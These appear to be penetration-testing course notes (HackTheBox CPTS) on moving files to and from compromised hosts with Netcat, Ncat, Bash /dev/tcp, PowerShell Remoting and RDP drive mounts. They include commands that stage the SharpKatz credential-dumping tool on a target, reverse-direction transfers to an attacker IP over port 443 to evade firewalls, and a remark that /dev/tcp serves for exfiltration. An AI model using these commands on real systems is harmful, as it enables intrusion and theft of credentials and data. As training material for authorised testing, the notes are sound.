# 05 — Miscellaneous File Transfer Methods

## Overview

When HTTP, HTTPS, or SMB are unavailable, alternative tools like Netcat, Ncat, PowerShell Remoting (WinRM), and RDP can be used for file transfers.

| Method | Protocol | Use Case |
|--------|----------|----------|
| **Netcat (nc)** | TCP/UDP | Raw socket file transfers, no dependencies |
| **Ncat** | TCP/UDP + SSL | Modern Netcat replacement with SSL support |
| **/dev/tcp** | TCP | Bash built-in, no tools needed |
| **PowerShell Remoting** | WinRM (5985/5986) | Windows-to-Windows transfers via PS sessions |
| **RDP** | RDP (3389) | Mount local folders into remote desktop sessions |

> **Key Insight:** Netcat is the Swiss army knife of networking — if the target has `nc`, you can transfer files regardless of what else is available.

---

## Netcat / Ncat File Transfers

### Method 1: Target Listens, Attacker Sends

The compromised machine listens for the incoming file.

**Compromised Machine — Start Listener:**

```bash
# Original Netcat
nc -l -p 8000 > SharpKatz.exe

# Ncat (use --recv-only to auto-close after transfer)
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

**Attack Host — Send File:**

```bash
# Original Netcat (-q 0 closes connection when done)
nc -q 0 192.168.49.128 8000 < SharpKatz.exe

# Ncat (--send-only closes when input exhausted)
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

> `-q 0` (Netcat) and `--send-only` (Ncat) both ensure the connection closes after the transfer completes instead of hanging.

---

### Method 2: Attacker Listens, Target Connects (Firewall Bypass)

When **inbound connections to the target are blocked**, reverse the direction — listen on the attack host instead.

**Attack Host — Listen and Serve File:**

```bash
# Original Netcat
sudo nc -l -p 443 -q 0 < SharpKatz.exe

# Ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

**Compromised Machine — Connect and Receive:**

```bash
# Original Netcat
nc 192.168.49.128 443 > SharpKatz.exe

# Ncat
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

> 💡 Using port 443 can help bypass firewall rules that allow outbound HTTPS traffic.

---

### Method 3: Bash /dev/tcp (No Tools Required)

When neither Netcat nor Ncat is available on the compromised machine, Bash's built-in `/dev/tcp` pseudo-device can establish TCP connections.

**Attack Host — Serve the File:**

```bash
# Original Netcat
sudo nc -l -p 443 -q 0 < SharpKatz.exe

# Ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

**Compromised Machine — Receive via /dev/tcp:**

```bash
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

> `/dev/tcp/host/port` is a Bash feature, not a real file — writing to it opens a TCP connection. Works in reverse too (exfil from target to attacker).

---

## Netcat Quick Reference

| Flag | Tool | Purpose |
|------|------|---------|
| `-l` | Both | Listen mode |
| `-p PORT` | Both | Specify port |
| `-q 0` | Netcat | Close after EOF |
| `--send-only` | Ncat | Close after input exhausted |
| `--recv-only` | Ncat | Close after transfer complete |
| `< file` | Both | Send file as input |
| `> file` | Both | Write received data to file |

> ⚠️ On HackTheBox PwnBox, `nc`, `ncat`, and `netcat` all point to **Ncat**.

---

## PowerShell Remoting (WinRM) File Transfer

For Windows-to-Windows transfers when HTTP/SMB are blocked. Uses WinRM on **TCP/5985 (HTTP)** or **TCP/5986 (HTTPS)**.

**Requirements:**
- Administrative access OR membership in `Remote Management Users` group
- PowerShell Remoting enabled on target

### Step 1: Verify Connectivity

```powershell
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

Confirm `TcpTestSucceeded : True` before proceeding.

### Step 2: Create Remote Session

```powershell
$Session = New-PSSession -ComputerName DATABASE01
```

### Step 3: Transfer Files

**Upload — Local to Remote:**

```powershell
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

**Download — Remote to Local:**

```powershell
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

> Key flags: `-ToSession` pushes files TO remote, `-FromSession` pulls files FROM remote.

---

## RDP File Transfer

### Method 1: Clipboard Copy/Paste

Standard RDP sessions support right-click → copy/paste between local and remote machines. Simple but unreliable in some scenarios.

### Method 2: Mount Local Folder into RDP Session (Preferred)

Exposes a local directory as a network share inside the RDP session at `\\tsclient\`.

**Using rdesktop:**

```bash
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

**Using xfreerdp:**

```bash
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

**Access in Remote Session:** Navigate to `\\tsclient\linux` in File Explorer.

> ⚠️ **Windows Defender Warning:** Shared directories containing malware (tools, payloads) may trigger Defender to delete files on your **local** machine.

> 🔒 The mounted drive is only accessible to YOUR RDP session — other users on the target cannot access it, even if they hijack the session.

**Using Windows mstsc.exe:** Local Resources tab → More → check the drives to share.

---

## Decision Matrix: Which Method to Use?

| Scenario | Best Method |
|----------|-------------|
| Target has `nc`/`ncat` | Netcat direct transfer |
| Inbound connections blocked | Reverse Netcat (attacker listens) |
| No tools on target, has Bash | `/dev/tcp` pseudo-device |
| Windows-to-Windows, WinRM open | PowerShell Remoting `Copy-Item` |
| RDP access available | Mount local folder via `xfreerdp`/`rdesktop` |
| Need encrypted transfer | Ncat with `--ssl` flag |

---

## Where These Techniques Apply

These methods are heavily used in later CPTS modules:

- **Active Directory Enumeration & Attacks** — Skills Assessments 1 & 2
- **Pivoting, Tunnelling & Port Forwarding** — throughout
- **Attacking Enterprise Networks** — throughout
- **Shells & Payloads** — throughout

> 💡 Master multiple methods. Restrictions in real engagements will force you to adapt — having "muscle memory" for several techniques means you always have a fallback.
